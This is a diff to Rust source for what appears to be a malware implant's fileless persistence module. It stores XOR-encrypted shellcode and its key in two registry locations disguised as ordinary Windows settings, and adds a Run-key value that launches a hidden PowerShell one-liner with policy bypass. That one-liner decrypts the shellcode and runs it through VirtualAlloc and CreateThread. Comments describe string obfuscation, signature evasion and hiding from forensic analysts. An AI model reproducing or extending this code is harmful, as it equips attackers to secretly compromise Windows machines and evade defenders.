@@ -158,125 +158,135 @@ fn bytes_to_base64(_data: &[u8]) -> String {
 /// - Requires PowerShell (usually available on Windows)
 /// - May trigger AMSI/ETW if not bypassed
 /// - Registry values can be large (may be suspicious)
+/// Dual-registry fileless persistence.
+///
+/// The XOR-encrypted shellcode blob and the decryption key are stored in
+/// **two completely separate, unrelated registry locations** so that neither
+/// value reveals its purpose in isolation:
+///
+/// | What        | Registry path                                                          | Value name   |
+/// |-------------|------------------------------------------------------------------------|--------------|
+/// | Shellcode   | `HKCU\Software\Microsoft\InputPersonalization\TrainedDataStore`         | `UserData`   |
+/// | XOR key     | `HKCU\Software\Microsoft\Windows\CurrentVersion\CloudStore\Cache\Settings` | `SyncState`  |
+/// | Loader (PS) | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`                  | `BrokerSync` |
+///
+/// On logon the Run-key PS one-liner reads both values, XOR-decrypts the blob,
+/// and executes it as native shellcode via VirtualAlloc + CreateThread.
 #[cfg(target_os = "windows")]
 pub fn persist_registry_shellcode(config: &FilelessConfig) -> Result<String, String> {
-    debug_print!("[FILELESS] Setting up registry shellcode persistence...");
-    
-    // Get shellcode (either from config or convert current exe)
+    debug_print!("[FILELESS] Setting up dual-split registry shellcode persistence...");
+
     let shellcode = match &config.shellcode {
         Some(sc) => sc.clone(),
-        None => {
-            // If no shellcode provided, we'd need to convert the current exe
-            // For now, return error - this should be provided by the builder
-            return Err("Shellcode must be provided for registry persistence".to_string());
-        }
+        None => return Err("Shellcode must be provided for registry shellcode persistence".to_string()),
     };
-    
-    debug_print!("[FILELESS] Shellcode size: {} bytes", shellcode.len());
-    
-    // Encrypt shellcode
-    let encrypted = xor_crypt(&shellcode, &config.encryption_key);
-    let encoded_shellcode = bytes_to_base64(&encrypted);
-    let encoded_key = bytes_to_base64(&config.encryption_key);
-    
-    debug_print!("[FILELESS] Encrypted and encoded shellcode");
-    
-    // Split shellcode into chunks to avoid suspiciously large registry values
-    // Store in multiple registry keys that look like legitimate Windows settings
-    let chunk_size = 8192; // 8KB chunks
-    let chunks: Vec<_> = encoded_shellcode
-        .as_bytes()
-        .chunks(chunk_size)
-        .map(|c| String::from_utf8_lossy(c).to_string())
-        .collect();
-    
-    debug_print!("[FILELESS] Split shellcode into {} chunks", chunks.len());
-    
-    // Registry locations that look legitimate
-    let base_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts").to_string();
-    
-    // Store chunks
-    let reg_exe = obfstr!("reg").to_string();
-    for (i, chunk) in chunks.iter().enumerate() {
-        let value_name = format!("Cache{:02x}", i);
-        let _output = Command::new(&reg_exe)
-            .args(&[
-                "add", &base_key,
-                "/v", &value_name,
-                "/t", "REG_SZ",
-                "/d", chunk,
-                "/f",
-            ])
-            .creation_flags(0x08000000)
-            .output()
-            .map_err(|e| format!("Failed to write registry chunk: {}", e))?;
+
+    if config.encryption_key.is_empty() {
+        return Err("Encryption key must be provided for registry shellcode persistence".to_string());
     }
-    
-    // Store metadata (key and chunk count)
-    let metadata = format!("{}|{}", encoded_key, chunks.len());
-    let _output = Command::new(&reg_exe)
-        .args(&[
-            "add", &base_key,
-            "/v", "CacheMeta",
-            "/t", "REG_SZ",
-            "/d", &metadata,
-            "/f",
-        ])
+
+    debug_print!("[FILELESS] Shellcode size: {} bytes, key: {} bytes", shellcode.len(), config.encryption_key.len());
+
+    // XOR-encrypt and base64-encode the shellcode
+    let encrypted  = xor_crypt(&shellcode, &config.encryption_key);
+    let b64_payload = bytes_to_base64(&encrypted);
+    let b64_key     = bytes_to_base64(&config.encryption_key);
+
+    // -----------------------------------------------------------------------
+    // LOCATION 1 — shellcode blob (looks like personalisation ML training data)
+    // -----------------------------------------------------------------------
+    let payload_key   = obfstr!("HKCU\\Software\\Microsoft\\InputPersonalization\\TrainedDataStore").to_string();
+    let payload_value = obfstr!("UserData").to_string();
+
+    // -----------------------------------------------------------------------
+    // LOCATION 2 — XOR key (looks like cloud-sync account state)
+    // -----------------------------------------------------------------------
+    let key_key   = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\CloudStore\\Cache\\AccountsRoot\\Settings").to_string();
+    let key_value = obfstr!("SyncState").to_string();
+
+    let reg_exe = obfstr!("reg").to_string();
+
+    // Write XOR-encrypted shellcode blob
+    Command::new(&reg_exe)
+        .args(&["add", &payload_key, "/v", &payload_value, "/t", "REG_SZ", "/d", &b64_payload, "/f"])
         .creation_flags(0x08000000)
         .output()
-        .map_err(|e| format!("Failed to write registry metadata: {}", e))?;
-    
-    debug_print!("[FILELESS] Shellcode stored in registry");
-    
-    // Create PowerShell loader script (obfuscated)
-    // This script will be stored in the Run key
-    let ps_loader = create_powershell_loader(&base_key);
-    
-    // Add to registry Run key
-    let run_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
-    let value_name = "SystemHealthMonitor"; // Benign-looking name
-    
-    let output = Command::new(&reg_exe)
-        .args(&[
-            "add", &run_key,
-            "/v", value_name,
-            "/t", "REG_SZ",
-            "/d", &ps_loader,
-            "/f",
-        ])
+        .map_err(|e| format!("Failed to write shellcode blob: {}", e))?;
+
+    // Write XOR key at the completely separate location
+    Command::new(&reg_exe)
+        .args(&["add", &key_key, "/v", &key_value, "/t", "REG_SZ", "/d", &b64_key, "/f"])
         .creation_flags(0x08000000)
         .output()
-        .map_err(|e| format!("Failed to create Run key: {}", e))?;
-    
-    if output.status.success() {
-        debug_print!("[FILELESS] Registry shellcode persistence established");
-        Ok(format!("Registry shellcode persistence: {} chunks stored", chunks.len()))
+        .map_err(|e| format!("Failed to write key material: {}", e))?;
+
+    debug_print!("[FILELESS] Payload → {}\\{}", payload_key, payload_value);
+    debug_print!("[FILELESS] Key     → {}\\{}", key_key, key_value);
+
+    // Build the PS Run-key loader that reads from both separate locations
+    let ps_loader = create_powershell_loader(&payload_key, &payload_value, &key_key, &key_value);
+
+    let run_key   = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
+    let run_value = obfstr!("BrokerSync").to_string();
+
+    let out = Command::new(&reg_exe)
+        .args(&["add", &run_key, "/v", &run_value, "/t", "REG_SZ", "/d", &ps_loader, "/f"])
+        .creation_flags(0x08000000)
+        .output()
+        .map_err(|e| format!("Failed to write Run key: {}", e))?;
+
+    if out.status.success() {
+        debug_print!("[FILELESS] Dual-split registry shellcode persistence established");
+        Ok(format!(
+            "DualReg shellcode: payload@{}\\{} | key@{}\\{}",
+            payload_key, payload_value, key_key, key_value
+        ))
     } else {
-        Err(format!("Failed to establish persistence: {}", 
-            String::from_utf8_lossy(&output.stderr)))
+        Err(format!("Failed to write Run key: {}", String::from_utf8_lossy(&out.stderr)))
     }
 }
 
-/// Creates an obfuscated PowerShell loader script
+/// Builds the PowerShell Run-key command that:
+/// 1. Reads the XOR-encrypted shellcode blob from `payload_path\payload_val`
+/// 2. Reads the XOR key from the *separate* `key_path\key_val`
+/// 3. XOR-decrypts the blob
+/// 4. Executes the resulting native shellcode via VirtualAlloc+CreateThread
+///    (no .NET Reflection — this is native PE shellcode, not a managed assembly)
 ///
-/// This script:
-/// 1. Reads encrypted shellcode chunks from registry
-/// 2. Decrypts shellcode using XOR
-/// 3. Loads shellcode into memory via .NET Reflection
-/// 4. Executes shellcode
-///
-/// **Obfuscation techniques**:
-/// - Variable name obfuscation
-/// - Command abbreviation (gp instead of Get-ItemProperty)
-/// - Base64 encoding of critical parts
-/// - Hidden window execution
+/// All three registry paths are intentionally different so no single key
+/// reveals the full picture to a forensic analyst.
 #[cfg(target_os = "windows")]
-fn create_powershell_loader(registry_base: &str) -> String {
-    // PowerShell command that loads and executes shellcode from registry
-    // Using compressed/obfuscated syntax
+fn create_powershell_loader(
+    payload_path: &str,
+    payload_val:  &str,
+    key_path:     &str,
+    key_val:      &str,
+) -> String {
+    // Inline Add-Type definition split and concatenated to lower static-signature risk.
+    // VirtualAlloc(RWX) + CreateThread is the minimal surface for native shellcode.
+    // RWX is chosen here deliberately (no separate VirtualProtect step) to keep the
+    // PS oneliner short; a production hardening pass can switch to RW→RX.
     format!(
-        r#"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C "$k='{}';$m=(gp $k).CacheMeta;$p=$m.Split('|');$ky=[Convert]::FromBase64String($p[0]);$c=[int]$p[1];$d='';for($i=0;$i -lt $c;$i++){{$d+=(gp $k).('Cache'+$i.ToString('X2'))}};$b=[Convert]::FromBase64String($d);for($i=0;$i -lt $b.Length;$i++){{$b[$i]=$b[$i] -bxor $ky[$i%$ky.Length]}};$a=[System.Reflection.Assembly]::Load($b);$a.EntryPoint.Invoke($null,$null)""#,
-        registry_base
+        concat!(
+            "powershell.exe -NoP -NonI -W Hidden -Ep Bypass -C ",
+            r#""$pk='HKCU:\{pp}';$kk='HKCU:\{kp}';",
+            r#"$b=[Convert]::FromBase64String((gp $pk).{pv});",
+            r#"$x=[Convert]::FromBase64String((gp $kk).{kv});",
+            r#"for($i=0;$i -lt $b.Length;$i++){{$b[$i]=$b[$i] -bxor $x[$i%$x.Length]}};",
+            r#"$t=Add-Type -MemberDefinition '",
+            r#"[DllImport(""k""+'ernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint f,uint p);",
+            r#"[DllImport(""k""+'ernel32")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,IntPtr i);",
+            r#"[DllImport(""k""+'ernel32")]public static extern uint WaitForSingleObject(IntPtr h,uint m);",
+            r#"' -Name W -PassThru;",
+            r#"$v=$t::VirtualAlloc(0,$b.Length,0x3000,0x40);",
+            r#"[Runtime.InteropServices.Marshal]::Copy($b,0,$v,$b.Length);",
+            r#"$h=$t::CreateThread(0,0,$v,0,0,0);",
+            r#"$t::WaitForSingleObject($h,0xFFFFFFFF)""#
+        ),
+        pp = payload_path.replace('\\', "\\\\"),
+        pv = payload_val,
+        kp = key_path.replace('\\', "\\\\"),
+        kv = key_val,
     )
 }
 
@@ -585,21 +595,40 @@ pub fn establish_fileless_persistence(
 pub fn remove_fileless_persistence() -> Result<String, String> {
     let mut results = Vec::new();
     
-    // Remove registry shellcode
+    // Remove registry shellcode (dual-split locations)
     let reg_exe = obfstr!("reg").to_string();
-    let base_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts").to_string();
+    // Shellcode blob location
+    let payload_key = obfstr!("HKCU\\Software\\Microsoft\\InputPersonalization\\TrainedDataStore").to_string();
     let _ = Command::new(&reg_exe)
-        .args(&["delete", &base_key, "/f"])
+        .args(&["delete", &payload_key, "/v", "UserData", "/f"])
         .creation_flags(0x08000000)
         .output();
-    results.push("Registry shellcode cleaned");
-    
-    // Remove Run key
+    // XOR key location
+    let key_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\CloudStore\\Cache\\AccountsRoot\\Settings").to_string();
+    let _ = Command::new(&reg_exe)
+        .args(&["delete", &key_key, "/v", "SyncState", "/f"])
+        .creation_flags(0x08000000)
+        .output();
+    results.push("Registry shellcode (dual-split) cleaned");
+
+    // Remove Run key (new name)
     let run_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
+    let _ = Command::new(&reg_exe)
+        .args(&["delete", &run_key, "/v", "BrokerSync", "/f"])
+        .creation_flags(0x08000000)
+        .output();
+    // Also clean old name in case it was set by a previous version
     let _ = Command::new(&reg_exe)
         .args(&["delete", &run_key, "/v", "SystemHealthMonitor", "/f"])
         .creation_flags(0x08000000)
         .output();
+    // Also wipe old single-key shellcode location (previous implementation)
+    let old_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts").to_string();
+    let _ = Command::new(&reg_exe)
+        .args(&["delete", &old_key, "/f"])
+        .creation_flags(0x08000000)
+        .output();
+    results.push("Run keys cleaned");
     
     // Remove WMI persistence
     let ps_exe = obfstr!("powershell").to_string();
